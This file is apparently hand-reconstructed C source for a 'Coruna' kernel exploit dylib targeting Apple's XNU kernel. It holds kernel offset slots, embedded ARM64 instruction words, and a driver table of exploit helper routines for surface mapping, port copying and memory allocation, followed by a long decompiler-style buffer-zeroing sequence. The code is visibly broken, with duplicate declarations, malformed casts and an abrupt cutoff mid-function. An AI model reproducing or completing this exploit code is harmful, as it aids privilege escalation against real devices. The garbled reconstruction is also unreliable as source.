/*
 * Coruna kernel exploit dylib (kernel6544) — hand-reconstructed native C
 *
 * Rebuild: hand-reconstructed — skipped by rebuild_native_source.py
 * Standard: Framework/coruna/docs/NATIVE_SOURCE_STANDARD.md
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>
typedef struct { uint64_t q0; uint64_t q1; } coruna_svc_regpack_t;


static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}


typedef void (*coruna_implant_trampoline_fn)(void);

static inline uint64_t coruna_u64_pack(uint32_t hi, uint32_t lo)
{
    return ((uint64_t)hi << 32) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack71(uint64_t hi7, uint8_t lo)
{
    return (hi7 << 8) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack14(uint8_t hi, uint64_t lo)
{
    return ((uint64_t)hi << 32) | (uint32_t)lo;
}

static inline uint64_t coruna_u64_pack13(uint8_t hi, uint32_t lo)
{
    return ((uint64_t)(uint8_t)hi << 24) | ((uint32_t)lo & 0xffffffU);
}

static inline uint64_t coruna_cat(uint64_t hi, uint64_t lo)
{
    return (hi << 32) | (uint32_t)lo;
}



/* Kernel module runtime constants (from Mach-O image) */
static uint64_t k_kernel_slot_1001;
static uint64_t k_kernel_slot_1870;
static uint64_t k_kernel_slot_1878;
static uint64_t k_kernel_slot_1880;
static uint64_t k_kernel_slot_1888;
static uint64_t k_kernel_slot_1890;
static uint64_t k_kernel_slot_1898;
static uint64_t k_kernel_slot_18a0;
static uint64_t k_kernel_slot_18a8;
static uint64_t k_kernel_slot_18b0;
static uint64_t k_kernel_slot_18b8;
static uint64_t k_kernel_slot_18c0;
static uint64_t k_kernel_slot_18d0;
static uint64_t k_kernel_slot_18e0;
static uint64_t k_kernel_slot_18e8;
static uint64_t k_kernel_slot_18f0;
static uint64_t k_kernel_slot_18f8;
static uint64_t k_kernel_slot_1900;
static uint64_t k_kernel_slot_1908;
static uint64_t k_kernel_slot_1910;
static uint64_t k_kernel_slot_1914;
static uint64_t k_kernel_slot_1918;
static uint64_t k_kernel_slot_191c;
static uint64_t k_kernel_slot_1920;
static uint64_t k_kernel_slot_1924;
static uint64_t k_kernel_slot_1928;
static uint64_t k_kernel_slot_192c;
static uint64_t k_kernel_slot_1930;
static uint64_t k_kernel_slot_1934;
static uint64_t k_kernel_slot_1938;
static uint64_t k_kernel_slot_193c;
static uint64_t k_kernel_slot_1940;
static uint64_t k_kernel_slot_1944;
static uint64_t k_kernel_slot_1948;
static uint64_t k_kernel_slot_1958;
static uint64_t k_kernel_slot_1960;
static uint64_t k_kernel_slot_1990;
static uint64_t k_kernel_slot_1998;
static uint64_t k_kernel_slot_19a0;
static uint64_t k_kernel_slot_19a8;
static uint64_t k_kernel_slot_19c8;
static uint64_t k_kernel_slot_19d0;
static uint64_t k_kernel_slot_19d8;
static uint64_t k_kernel_slot_19e0;
static uint64_t k_kernel_slot_19e8;
static uint64_t k_kernel_slot_19f0;
static uint64_t k_kernel_slot_19f8;
static uint64_t k_kernel_slot_1a00;
static uint64_t k_kernel_slot_1a08;
static uint64_t k_kernel_slot_1a10;
static uint64_t k_kernel_slot_1a18;
static uint64_t k_kernel_slot_1d08;
static uint64_t k_kernel_slot_1d10;
static uint64_t k_kernel_slot_1d18;
static uint64_t k_kernel_slot_1d20;
static uint64_t k_kernel_slot_1d28;
static uint64_t k_kernel_slot_1d30;
static uint64_t k_kernel_slot_1d38;
static uint64_t k_kernel_slot_1d48;
static uint64_t k_kernel_slot_2240;
static uint64_t k_kernel_slot_2710;
static uint64_t k_kernel_slot_2c20;
static uint64_t k_kernel_slot_3448;
static uint64_t k_kernel_slot_3450;
static uint64_t k_kernel_slot_3458;
static uint64_t k_kernel_slot_3460;
static uint64_t k_kernel_slot_3468;
static uint64_t k_kernel_slot_3488;
static uint64_t k_kernel_slot_3490;
static uint64_t k_kernel_slot_34a8;
static uint64_t k_kernel_slot_34f0;
static uint64_t k_kernel_slot_3500;
static uint64_t k_kernel_slot_3508;
static uint64_t k_kernel_slot_3510;
static uint64_t k_kernel_slot_3518;
static uint64_t k_kernel_slot_4001;
static uint64_t k_kernel_slot_4100;
static uint64_t k_kernel_slot_5070;
static uint64_t k_kernel_rodata_word_3b260 = 0xa9027bfda9014ff4ULL;
static uint64_t k_kernel_rodata_word_3b268 = 0xaa0003f3910083fdULL;
static uint64_t k_kernel_rodata_word_3b270 = 0xb400072097ffe4d2ULL;
static uint64_t k_kernel_rodata_word_3b278 = 0xb941426952800008ULL;
static uint64_t k_kernel_rodata_word_3b280 = 0x6b0a013f5283ea6aULL;
static uint64_t k_kernel_rodata_word_3b288 = 0x52844b6a5400018dULL;
static uint64_t k_kernel_rodata_word_3b290 = 0x5400036c6b0a013fULL;
static uint64_t k_kernel_rodata_word_3b298 = 0x6b0a013f5283ea8aULL;
static uint32_t k_kernel_rodata_word_3b2e0 = 0x92bfb009;
static uint32_t k_kernel_rodata_word_3b2f4 = 0x52809a09;
static uint32_t k_kernel_rodata_word_3b328 = 0x52807808;
static uint32_t k_kernel_rodata_word_3b33c = 0xaa1303e0;
static uint64_t k_kernel_rodata_word_3b3e0 = 0xaa0303f4aa0403f7ULL;
static uint64_t k_kernel_rodata_word_3b3e8 = 0xaa0103f5aa0203f8ULL;
static uint64_t k_kernel_rodata_word_3b3f0 = 0xf90013ffaa0003f3ULL;
static uint64_t k_kernel_rodata_word_3b3f8 = 0xb4002d4097ffe726ULL;
static uint64_t k_kernel_rodata_word_3b400 = 0xaa1303e0aa0003f6ULL;
static uint64_t k_kernel_rodata_word_3b408 = 0x97ffecb252800401ULL;
static uint64_t k_kernel_rodata_word_3b410 = 0x91024ad834000dc0ULL;
static uint64_t k_kernel_rodata_word_3b418 = 0xaa1303e091007be3ULL;
static uint32_t k_kernel_rodata_word_3b430 = 0x39407be8;
static uint32_t k_kernel_rodata_word_3b444 = 0xaa1303e0;
static uint64_t k_kernel_rodata_word_3b448 = 0x52800023aa1803e1ULL;
static uint64_t k_kernel_rodata_word_3b460 = 0x910043e28b0802c1ULL;
static uint64_t k_kernel_rodata_word_3b46c = 0x340029a097ffb76cULL;
static uint64_t k_kernel_rodata_word_3b4d8 = 0xb400262097ff7c42ULL;
static uint64_t k_kernel_rodata_word_3b4e0 = 0x91001301f94e9a60ULL;
static uint64_t k_kernel_rodata_word_3b4e8 = 0xb40025a097ff8ffbULL;
static uint64_t k_kernel_rodata_word_3b4f0 = 0xf94e9a60aa0003e1ULL;
static uint64_t k_kernel_rodata_word_3b4fc = 0xf94007e8b4002520ULL;
static uint64_t k_kernel_rodata_word_3b540 = 0xaa1303e091010fe2ULL;
static uint64_t k_kernel_rodata_word_3b558 = 0x9100a3e29102c2c1ULL;
static uint64_t k_kernel_rodata_word_3b560 = 0x97ffb72eaa1303e0ULL;
static uint64_t k_kernel_rodata_word_3b760 = 0x1400009035000ec0ULL;
static uint64_t k_kernel_rodata_word_3b780 = 0x6b09011f5283ea49ULL;
static uint64_t k_kernel_rodata_word_3b788 = 0x528012e8540001adULL;
static uint64_t k_kernel_rodata_word_3b790 = 0x5283836914000059ULL;
static uint64_t k_kernel_rodata_word_3b798 = 0x540001ab6b09011fULL;
static uint64_t k_kernel_rodata_word_3b7b0 = 0x52801fe9528020e8ULL;
static uint64_t k_kernel_rodata_word_3b7b8 = 0x5283834917ffffa7ULL;
static uint64_t k_kernel_rodata_word_3b7c0 = 0x5400082d6b09011fULL;
static uint64_t k_kernel_rodata_word_3b7c8 = 0x1400004a52801be8ULL;
static uint64_t k_kernel_rodata_word_3b7d0 = 0x92bf0e09f940ae68ULL;
static uint64_t k_kernel_rodata_word_3b7e0 = 0x528021e8eb09011fULL;
static uint64_t k_kernel_rodata_word_3b800 = 0x97fff4cdd2800003ULL;
static uint64_t k_kernel_rodata_word_3c8a8 = 0xa9017bfda9be4ff4ULL;
static uint64_t k_kernel_rodata_word_3c8c8 = 0x1283ea495400010cULL;
static uint64_t k_kernel_rodata_word_3c8e8 = 0x6b09011f52844b09ULL;
static uint64_t k_kernel_rodata_word_3c950 = 0xa8c24ff4a9417bfdULL;
static uint64_t k_kernel_rodata_word_3c970 = 0x910143fda9057bfdULL;
static uint64_t k_kernel_rodata_word_3c990 = 0xf94001085803c808ULL;
static uint64_t k_kernel_rodata_word_3d090 = 0x910063e2f9000fffULL;
static uint64_t k_kernel_rodata_word_40000 = 0xaa1403e0910003e8ULL;
static uint64_t k_kernel_rodata_word_40008 = 0x5280000097ffe83aULL;
static uint64_t k_kernel_rodata_word_40010 = 0xb4000cc8f94007e8ULL;
static uint64_t k_kernel_rodata_word_40018 = 0xb4000c89f9400be9ULL;
static uint64_t k_kernel_rodata_word_40020 = 0x30015babf94003eaULL;
static uint64_t k_kernel_rodata_word_40028 = 0x30015aacd503201fULL;
static uint64_t k_kernel_rodata_word_40030 = 0x52844b6dd503201fULL;
static uint64_t k_kernel_rodata_word_40038 = 0x9a8bc1816b0d02dfULL;
static uint64_t k_kernel_rodata_word_40040 = 0xf9000be9a90023eaULL;
static uint16_t k_kernel_rodata_word_40048 = 0x03e0;
static uint16_t k_kernel_rodata_word_4004a = 0x9100;
static uint16_t k_kernel_rodata_word_4004c = 0x0002;
static uint16_t k_kernel_rodata_word_4004e = 0x5280;
static uint16_t k_kernel_rodata_word_40050 = 0x0023;
static uint16_t k_kernel_rodata_word_40052 = 0x5280;
static uint16_t k_kernel_rodata_word_40054 = 0x7a3f;
static uint16_t k_kernel_rodata_word_40056 = 0x97ff;
static uint16_t k_kernel_rodata_word_40058 = 0x0aa0;
static uint16_t k_kernel_rodata_word_4005a = 0xb400;
static uint16_t k_kernel_rodata_word_4005c = 0x03f7;
static uint16_t k_kernel_rodata_word_4005e = 0xaa00;
static uint16_t k_kernel_rodata_word_40060 = 0xfe80;
static uint16_t k_kernel_rodata_word_40062 = 0xf94c;
static uint16_t k_kernel_rodata_word_40064 = 0x42e1;
static uint16_t k_kernel_rodata_word_40066 = 0xd100;
static uint16_t k_kernel_rodata_word_40068 = 0x7d1b;
static uint16_t k_kernel_rodata_word_4006a = 0x97ff;
static uint16_t k_kernel_rodata_word_4006c = 0x0a00;
static uint16_t k_kernel_rodata_word_4006e = 0xb400;
static uint16_t k_kernel_rodata_word_40070 = 0x03f6;
static uint64_t k_kernel_rodata_word_40072 = 0x22e1f94cfe80aa00ULL;
static uint64_t k_kernel_rodata_word_40078 = 0x97ff7d16d10022e1ULL;
static uint64_t k_kernel_rodata_word_40080 = 0xb4000940f9000fe0ULL;
static uint64_t k_kernel_rodata_word_40088 = 0xaa1603f7f90002a0ULL;
static uint64_t k_kernel_rodata_word_40090 = 0xf9408e8814000040ULL;
static uint64_t k_kernel_rodata_word_40098 = 0xaa1403e0f940a117ULL;
static uint64_t k_kernel_rodata_word_400a0 = 0x72a0a30152880021ULL;
static uint64_t k_kernel_rodata_word_400a8 = 0x34fff4e097ffd98bULL;
static uint64_t k_kernel_rodata_word_400b0 = 0xfa401ae4f10002dfULL;
static uint64_t k_kernel_rodata_word_400b8 = 0xf90002b654fff480ULL;
static uint64_t k_kernel_rodata_word_400c0 = 0x14000039f9000277ULL;
static uint64_t k_kernel_rodata_word_400c8 = 0xaa1403e0910003e8ULL;
static uint64_t k_kernel_rodata_word_400d0 = 0x5280000097ffe808ULL;
static uint64_t k_kernel_rodata_word_400d8 = 0xb4000688f94007e8ULL;
static uint64_t k_kernel_rodata_word_400e0 = 0xb4000649f9400be9ULL;
static uint64_t k_kernel_rodata_word_3b240 = 0x910023e2910022c1ULL;
static uint64_t k_kernel_rodata_word_3b250 = 0x35ffe9e097ff6385ULL;
static uint64_t k_kernel_rodata_word_3b2a0 = 0x52844b0a54000400ULL;
static uint64_t k_kernel_rodata_word_3b2b0 = 0x1400002052809588ULL;
static uint64_t k_kernel_rodata_word_3b2c0 = 0x5283836a54000340ULL;
static uint64_t k_kernel_rodata_word_3b2d0 = 0x6b0a013f5283ea6aULL;
static uint64_t k_kernel_rodata_word_3b2e4 = 0xf2e003e9f2ca61e9ULL;
static uint64_t k_kernel_rodata_word_3b2f8 = 0x1400000e9a888128ULL;
static uint64_t k_kernel_rodata_word_3b308 = 0x5284e24a54000080ULL;
static uint64_t k_kernel_rodata_word_3b318 = 0x140000065280d488ULL;
static uint64_t k_kernel_rodata_word_3b32c = 0x5280750814000002ULL;
static uint64_t k_kernel_rodata_word_3b340 = 0x97ffbb0caa1403e1ULL;
static uint64_t k_kernel_rodata_word_3b350 = 0x340000e953187d09ULL;
static uint64_t k_kernel_rodata_word_3b360 = 0xa9414ff4a9427bfdULL;
static uint64_t k_kernel_rodata_word_3b370 = 0x321b010af940ae69ULL;
static uint64_t k_kernel_rodata_word_3b380 = 0x320d016b0a0b010bULL;
static uint64_t k_kernel_rodata_word_3b390 = 0x1a8a8169eb0c013fULL;
static uint64_t k_kernel_rodata_word_3b3a0 = 0x540000a06b02011fULL;
static uint64_t k_kernel_rodata_word_3b3b0 = 0x34fffd2097ffb905ULL;
static uint64_t k_kernel_rodata_word_3b3c0 = 0xa9056ffcd102c3ffULL;
static uint64_t k_kernel_rodata_word_3b3d0 = 0xa9094ff4a90857f6ULL;
static uint64_t k_kernel_rodata_word_3b420 = 0x52800022aa1803e1ULL;
static uint64_t k_kernel_rodata_word_3b434 = 0x540009006b17011fULL;
static uint64_t k_kernel_rodata_word_3b520 = 0x52800022aa1703e1ULL;
static uint64_t k_kernel_rodata_word_3b530 = 0x3700012839410fe8ULL;
static uint64_t k_kernel_rodata_word_3b548 = 0x52800023aa1703e1ULL;
static uint64_t k_kernel_rodata_word_3b770 = 0xaa1303e05400012bULL;
static uint64_t k_kernel_rodata_word_3b7a0 = 0x52a00101aa1303e0ULL;
static uint64_t k_kernel_rodata_word_3b7f0 = 0xaa1303e017ffff9aULL;
static uint64_t k_kernel_rodata_word_3b810 = 0x52800318d280001aULL;
static uint64_t k_kernel_rodata_word_3b820 = 0xf94d09179b184f48ULL;
static uint64_t k_kernel_rodata_word_3b830 = 0x97ff7b6baa1703e1ULL;
static uint64_t k_kernel_rodata_word_3b840 = 0x910022e1540003a0ULL;
static uint64_t k_kernel_rodata_word_3b850 = 0x97ffaa4a52800102ULL;
static uint64_t k_kernel_rodata_word_3b860 = 0xf2aeace9d28cae49ULL;
static uint64_t k_kernel_rodata_word_3b870 = 0x540001e1eb09011fULL;
static uint64_t k_kernel_rodata_word_3b87c = 0x910113e28b170378ULL;
static uint64_t k_kernel_rodata_word_400000008;
static uint64_t k_kernel_rodata_word_400004008;
static void *ptr_kernel6544_fn_3c918 = (void *)0xf2dffe00f2a4e000ULL;
static void *k_kernel_ndr_record_slot = (void *)0x540004eb6b1a033fULL;
static void *k_kernel_sandbox_check_no_report_slot = (void *)0x37f804a879c01fe8ULL;
static void *k_kernel_nsconcretestackblock_slot = (void *)0xaa1303e091003be2ULL;
static void *k_kernel_kernelversionstring_slot = (void *)0x52800043aa1803e1ULL;
static void *k_kernel_chkstk_darwin_slot = (void *)0xa9457bfdaa1403e0ULL;
static void *k_kernel_chkstk_darwin_slot = (void *)0xa94357f6a9444ff4ULL;
static void *k_kernel_chkstk_darwin_slot = (void *)0xa94167faa9425ff8ULL;
static void *k_kernel_chkstk_darwin_slot = (void *)0xd65f03c0910183ffULL;
static void *k_kernel_stack_chk_guard_slot = (void *)0x1400001f97ffb8bfULL;
static void *k_kernel_get_cpu_capabilities_slot = (void *)0x52884021aa1303e0ULL;
static void *k_kernel_bootstrap_port_slot = (void *)0x97ffe7ae72a0ab01ULL;
static void *k_kernel_dyldversionnumber_slot = (void *)0x52800e087100001fULL;
static void *k_kernel_kcfallocatordefault_slot = (void *)0x9a88013852801709ULL;
static void *k_kernel_kcfallocatornull_slot = (void *)0xaa1703e1aa1303e0ULL;
static void *k_kernel_kcfbooleanfalse_slot = (void *)0xb400024097ffdaf3ULL;
static void *k_kernel_kcfbooleantrue_slot = (void *)0x91003be38b180018ULL;
static void *k_kernel_kcfrunloopdefaultmode_slot = (void *)0xaa1803e1aa1303e0ULL;
static void *k_kernel_kcftypedictionarykeycallbacks_slot = (void *)0x97ffa64a52800042ULL;
static void *k_kernel_kcftypedictionaryvaluecallbacks_slot = (void *)0x79c01fe834000160ULL;
static void *k_kernel_kiomasterportdefault_slot = (void *)0x3211010837fffb88ULL;
static void *k_kernel_mach_task_self_slot = (void *)0x910033e279001be8ULL;
static void *k_kernel_vm_page_mask_slot = (void *)0xaa1803e1aa1303e0ULL;
static void *k_kernel_vm_page_shift_slot = (void *)0x97ffb8a252800043ULL;
static void *k_kernel_vm_page_size_slot = (void *)0x528000b435fffa80ULL;


uint64_t _driver(uint64_t *val)
{
  uint32_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  if (val != (uint64_t *)0x0) {
    ptr = _calloc(1,0x50);
    if (ptr == (uint32_t *)0x0) {
      u = 0xad009;
    }
    else {
      u = 0;
      *ptr = 0x20002;
      ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_ctx_free_661c;
      ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_kernel6544_residual_241;
      ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_kernel29bb0_via_call_plist_dict_36818;
      ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_call_surface_map;
      ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_call_pthread_mutex_destroy;
      ((void (**)(void *, long, uint64_t))(ptr + 0xe))[0] = coruna_driver_copy_port_1918;
      ((void (**)(void *, long, uint64_t))(ptr + 0x10))[0] = coruna_surface_map_range;
      ((void (**)(void *, long, uint64_t))(ptr + 0x12))[0] = coruna_parse_xnu_processors;
      *val = ptr;
    }
  }
  return u;
}





uint64_t coruna_ctx_free_661c(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    _free(val);
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_ctx_free_6624(uint64_t *val)
{
  val[7] = 0;
  val[6] = 0;
  val[9] = 0;
  val[8] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  _free(val);
  return 0;
}





uint64_t coruna_kernel6544_residual_241(long handle,uint64_t val,uint64_t *id_2)
{
  uint64_t u;
  uint64_t scratch;
  
  scratch = 0;
  u = 0xad001;
  if (((handle != 0) && (id_2 != (uint64_t *)0x0)) &&
     (u = coruna_kernel6544_via_kernel09_via_vm_allocate(&scratch), (int)u == 0)) {
    *id_2 = scratch;
  }
  return u;
}





uint64_t coruna_kernel29bb0_via_call_plist_dict_36818(long handle,long addr_2,uint64_t val)
{
  uint64_t u;
  
  if ((handle != 0) && (addr_2 != 0)) {
    u = coruna_call_plist_dict_36818(addr_2,val);
    return u;
  }
  return 0xad001;
}





void coruna_call_plist_dict_36818_stub(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_call_plist_dict_36818(id_2,size_3);
  return;
}





uint64_t coruna_call_surface_map(long handle,long addr_2)
{
  uint64_t u;
  
  if ((handle != 0) && (addr_2 != 0)) {
    u = coruna_surface_map(addr_2);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_call_pthread_mutex_destroy(long handle,long addr_2)
{
  uint64_t u;
  
  if ((handle != 0) && (addr_2 != 0)) {
    u = coruna_pthread_mutex_destroy(addr_2);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_copy_port_1918(long handle,long addr_2,int *flags)
{
  uint64_t u;
  
  u = 0xad001;
  if (((handle != 0) && (addr_2 != 0)) && (flags != (int *)0x0)) {
    u = 0xad00a;
    if (1 < *(int *)(&k_kernel_slot_1918 + addr_2) + 1U) {
      *flags = *(int *)(&k_kernel_slot_1918 + addr_2);
      return 0;
    }
  }
  return u;
}





unsigned long coruna_surface_map_range(long arg,long *val,long n,uint m,uint p)

{
  long handle;
  bool err;
  uint u;
  unsigned long size;
  unsigned long version;
  uint64_t *ptr;
  uint port;
  long scratch;
  
  scratch = 0;
  size = 0xad001;
  if ((((arg != 0) && (val != (long *)0x0)) &&
      (((n != 0 && (m != 0)) || ((n == 0 && (m == 0)))))) &&
     ((handle = *val, *val != 0 ||
      (size = (**(void (**)(arg + 0x18))(arg,0,&scratch), handle = scratch, (int)size == 0
      )))) {
    scratch = handle;
    if (m != 0) {
      version = 0;
      size = 1;
      port = 1;
      ptr = (uint64_t *)(n + 8);
      do {
        u = (**(void (**)(arg + 0x28))(arg,scratch,*(uint32_t *)(ptr + -1),*ptr)
        ;
        if (port == 0) {
          u = (uint)version;
        }
        version = (unsigned long)u;
        port = (uint)(u == 0);
        err = size < m;
        size = size + 1;
        ptr = ptr + 2;
      } while ((p | port) == 1 && err);
      if (u != 0) {
        if (*val != 0) {
          return version;
        }
        if ((p & 1) == 0) {
          (**(void (**)(arg + 0x30))(arg,scratch);
        }
        (**(void (**)(arg + 0x20))(arg,scratch);
        return version;
      }
    }
    size = 0;
    *val = scratch;
  }
  return size;
}





void coruna_parse_xnu_processors(long handle,size_t *len)
{
  mach_port_t host;
  kern_return_t lk1;
  int err;
  char *ptr;
  size_t scratch;
  uint32_t bootargs;
  int thread_attr [2];
  char host_info [512];
  
  if (handle == 0) {
    return;
  }
  if (len == (size_t *)0x0) {
    return;
  }
  host_info[0x1e8] = '\0';
  host_info[0x1e9] = '\0';
  host_info[0x1ea] = '\0';
  host_info[0x1eb] = '\0';
  host_info[0x1ec] = '\0';
  host_info[0x1ed] = '\0';
  host_info[0x1ee] = '\0';
  host_info[0x1ef] = '\0';
  host_info[0x1e0] = '\0';
  host_info[0x1e1] = '\0';
  host_info[0x1e2] = '\0';
  host_info[0x1e3] = '\0';
  host_info[0x1e4] = '\0';
  host_info[0x1e5] = '\0';
  host_info[0x1e6] = '\0';
  host_info[0x1e7] = '\0';
  host_info[0x1f8] = '\0';
  host_info[0x1f9] = '\0';
  host_info[0x1fa] = '\0';
  host_info[0x1fb] = '\0';
  host_info[0x1fc] = '\0';
  host_info[0x1fd] = '\0';
  host_info[0x1fe] = '\0';
  host_info[0x1ff] = '\0';
  host_info[0x1f0] = '\0';
  host_info[0x1f1] = '\0';
  host_info[0x1f2] = '\0';
  host_info[499] = '\0';
  host_info[500] = '\0';
  host_info[0x1f5] = '\0';
  host_info[0x1f6] = '\0';
  host_info[0x1f7] = '\0';
  host_info[0x1c8] = '\0';
  host_info[0x1c9] = '\0';
  host_info[0x1ca] = '\0';
  host_info[0x1cb] = '\0';
  host_info[0x1cc] = '\0';
  host_info[0x1cd] = '\0';
  host_info[0x1ce] = '\0';
  host_info[0x1cf] = '\0';
  host_info[0x1c0] = '\0';
  host_info[0x1c1] = '\0';
  host_info[0x1c2] = '\0';
  host_info[0x1c3] = '\0';
  host_info[0x1c4] = '\0';
  host_info[0x1c5] = '\0';
  host_info[0x1c6] = '\0';
  host_info[0x1c7] = '\0';
  host_info[0x1d8] = '\0';
  host_info[0x1d9] = '\0';
  host_info[0x1da] = '\0';
  host_info[0x1db] = '\0';
  host_info[0x1dc] = '\0';
  host_info[0x1dd] = '\0';
  host_info[0x1de] = '\0';
  host_info[0x1df] = '\0';
  host_info[0x1d0] = '\0';
  host_info[0x1d1] = '\0';
  host_info[0x1d2] = '\0';
  host_info[0x1d3] = '\0';
  host_info[0x1d4] = '\0';
  host_info[0x1d5] = '\0';
  host_info[0x1d6] = '\0';
  host_info[0x1d7] = '\0';
  host_info[0x1a8] = '\0';
  host_info[0x1a9] = '\0';
  host_info[0x1aa] = '\0';
  host_info[0x1ab] = '\0';
  host_info[0x1ac] = '\0';
  host_info[0x1ad] = '\0';
  host_info[0x1ae] = '\0';
  host_info[0x1af] = '\0';
  host_info[0x1a0] = '\0';
  host_info[0x1a1] = '\0';
  host_info[0x1a2] = '\0';
  host_info[0x1a3] = '\0';
  host_info[0x1a4] = '\0';
  host_info[0x1a5] = '\0';
  host_info[0x1a6] = '\0';
  host_info[0x1a7] = '\0';
  host_info[0x1b8] = '\0';
  host_info[0x1b9] = '\0';
  host_info[0x1ba] = '\0';
  host_info[0x1bb] = '\0';
  host_info[0x1bc] = '\0';
  host_info[0x1bd] = '\0';
  host_info[0x1be] = '\0';
  host_info[0x1bf] = '\0';
  host_info[0x1b0] = '\0';
  host_info[0x1b1] = '\0';
  host_info[0x1b2] = '\0';
  host_info[0x1b3] = '\0';
  host_info[0x1b4] = '\0';
  host_info[0x1b5] = '\0';
  host_info[0x1b6] = '\0';
  host_info[0x1b7] = '\0';
  host_info[0x188] = '\0';
  host_info[0x189] = '\0';
  host_info[0x18a] = '\0';
  host_info[0x18b] = '\0';
  host_info[0x18c] = '\0';
  host_info[0x18d] = '\0';
  host_info[0x18e] = '\0';
  host_info[399] = '\0';
  host_info[0x180] = '\0';
  host_info[0x181] = '\0';
  host_info[0x182] = '\0';
  host_info[0x183] = '\0';
  host_info[0x184] = '\0';
  host_info[0x185] = '\0';
  host_info[0x186] = '\0';
  host_info[0x187] = '\0';
  host_info[0x198] = '\0';
  host_info[0x199] = '\0';
  host_info[0x19a] = '\0';
  host_info[0x19b] = '\0';
  host_info[0x19c] = '\0';
  host_info[0x19d] = '\0';
  host_info[0x19e] = '\0';
  host_info[0x19f] = '\0';
  host_info[400] = '\0';
  host_info[0x191] = '\0';
  host_info[0x192] = '\0';
  host_info[0x193] = '\0';
  host_info[0x194] = '\0';
  host_info[0x195] = '\0';
  host_info[0x196] = '\0';
  host_info[0x197] = '\0';
  host_info[0x168] = '\0';
  host_info[0x169] = '\0';
  host_info[0x16a] = '\0';
  host_info[0x16b] = '\0';
  host_info[0x16c] = '\0';
  host_info[0x16d] = '\0';
  host_info[0x16e] = '\0';
  host_info[0x16f] = '\0';
  host_info[0x160] = '\0';
  host_info[0x161] = '\0';
  host_info[0x162] = '\0';
  host_info[0x163] = '\0';
  host_info[0x164] = '\0';
  host_info[0x165] = '\0';
  host_info[0x166] = '\0';
  host_info[0x167] = '\0';
  host_info[0x178] = '\0';
  host_info[0x179] = '\0';
  host_info[0x17a] = '\0';
  host_info[0x17b] = '\0';
  host_info[0x17c] = '\0';
  host_info[0x17d] = '\0';
  host_info[0x17e] = '\0';
  host_info[0x17f] = '\0';
  host_info[0x170] = '\0';
  host_info[0x171] = '\0';
  host_info[0x172] = '\0';
  host_info[0x173] = '\0';
  host_info[0x174] = '\0';
  host_info[0x175] = '\0';
  host_info[0x176] = '\0';
  host_info[0x177] = '\0';
  host_info[0x148] = '\0';
  host_info[0x149] = '\0';
  host_info[0x14a] = '\0';
  host_info[0x14b] = '\0';
  host_info[0x14c] = '\0';
  host_info[0x14d] = '\0';
  host_info[0x14e] = '\0';
  host_info[0x14f] = '\0';
  host_info[0x140] = '\0';
  host_info[0x141] = '\0';
  host_info[0x142] = '\0';
  host_info[0x143] = '\0';
  host_info[0x144] = '\0';
  host_info[0x145] = '\0';
  host_info[0x146] = '\0';
  host_info[0x147] = '\0';
  host_info[0x158] = '\0';
  host_info[0x159] = '\0';
  host_info[0x15a] = '\0';
  host_info[0x15b] = '\0';
  host_info[0x15c] = '\0';
  host_info[0x15d] = '\0';
  host_info[0x15e] = '\0';
  host_info[0x15f] = '\0';
  host_info[0x150] = '\0';
  host_info[0x151] = '\0';
  host_info[0x152] = '\0';
  host_info[0x153] = '\0';
  host_info[0x154] = '\0';
  host_info[0x155] = '\0';
  host_info[0x156] = '\0';
  host_info[0x157] = '\0';
  host_info[0x128] = '\0';
  host_info[0x129] = '\0';
  host_info[0x12a] = '\0';
  host_info[299] = '\0';
  host_info[300] = '\0';
  host_info[0x12d] = '\0';
  host_info[0x12e] = '\0';
  host_info[0x12f] = '\0';
  host_info[0x120] = '\0';
  host_info[0x121] = '\0';
  host_info[0x122] = '\0';
  host_info[0x123] = '\0';
  host_info[0x124] = '\0';
  host_info[0x125] = '\0';
  host_info[0x126] = '\0';
  host_info[0x127] = '\0';
  host_info[0x138] = '\0';
  host_info[0x139] = '\0';
  host_info[0x13a] = '\0';
  host_info[0x13b] = '\0';
  host_info[0x13c] = '\0';
  host_info[0x13d] = '\0';
  host_info[0x13e] = '\0';
  host_info[0x13f] = '\0';
  host_info[0x130] = '\0';
  host_info[0x131] = '\0';
  host_info[0x132] = '\0';
  host_info[0x133] = '\0';
  host_info[0x134] = '\0';
  host_info[0x135] = '\0';
  host_info[0x136] = '\0';
  host_info[0x137] = '\0';
  host_info[0x108] = '\0';
  host_info[0x109] = '\0';
  host_info[0x10a] = '\0';
  host_info[0x10b] = '\0';
  host_info[0x10c] = '\0';
  host_info[0x10d] = '\0';
  host_info[0x10e] = '\0';
  host_info[0x10f] = '\0';
  host_info[0x100] = '\0';
  host_info[0x101] = '\0';
  host_info[0x102] = '\0';
  host_info[0x103] = '\0';
  host_info[0x104] = '\0';
  host_info[0x105] = '\0';
  host_info[0x106] = '\0';
  host_info[0x107] = '\0';
  host_info[0x118] = '\0';
  host_info[0x119] = '\0';
  host_info[0x11a] = '\0';
  host_info[0x11b] = '\0';
  host_info[0x11c] = '\0';
  host_info[0x11d] = '\0';
  host_info[0x11e] = '\0';
  host_info[0x11f] = '\0';
  host_info[0x110] = '\0';
  host_info[0x111] = '\0';
  host_info[0x112] = '\0';
  host_info[0x113] = '\0';
  host_info[0x114] = '\0';
  host_info[0x115] = '\0';
  host_info[0x116] = '\0';
  host_info[0x117] = '\0';
  host_info[0xe8] = '\0';
